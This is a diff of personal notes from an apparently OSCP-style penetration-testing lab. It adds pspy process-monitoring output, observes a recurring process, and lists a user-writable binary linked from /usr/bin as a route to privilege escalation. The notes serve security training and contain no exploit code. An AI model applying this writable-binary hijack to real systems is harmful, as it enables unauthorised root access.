 
-###### \[\[Authentication 繞過]]
+```
+$ chmod +x pspy64
+$ timeout  120 ./pspy64  -pf -i 1000
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done                                                                                                                                                                                                
+2026/01/09 07:34:37 CMD: UID=1000  PID=7115   | ./pspy64 -pf -i 1000                                                                                                                                
+2026/01/09 07:34:37 CMD: UID=1000  PID=7114   | timeout 120 ./pspy64 -pf -i 1000                                                                                                                    
+2026/01/09 07:34:37 CMD: UID=1000  PID=6795   | /bin/sh -i                                 
+```
+
+it appear every 10 sec , so we may use it\
+![Pasted image 20260109153903.png](/ob/Pasted%20image%2020260109153903.png)
+
+![Pasted image 20260109154022.png](/ob/Pasted%20image%2020260109154022.png)
+
+![Pasted image 20260109154320.png](/ob/Pasted%20image%2020260109154320.png)
 
 ```
+aero@oscp:/tmp$ ls -al /usr/bin/asinfo
+lrwxrwxrwx 1 root root 25 Dec  7  2019 /usr/bin/asinfo -> /opt/aerospike/bin/asinfo
+aero@oscp:/tmp$ ls -al /opt/aerospike/bin/asinfo
+-rwxr-xr-x 1 aero aero 12855 Dec  7  2019 /opt/aerospike/bin/asinfo
+aero@oscp:/tmp$ whoami
+aero
 ```
 
-###### \[\[OS Command Injection 命令注入]]
+![Pasted image 20260109161705.png](/ob/Pasted%20image%2020260109161705.png)
 
-```
-```
-
-###### \[\[登入爆破]]
-
-```
-```
-
-***
+next for this : https://hackmd.io/@roger102/S1Zc6uHzgg#144-%E2%80%93gt-prooftxt
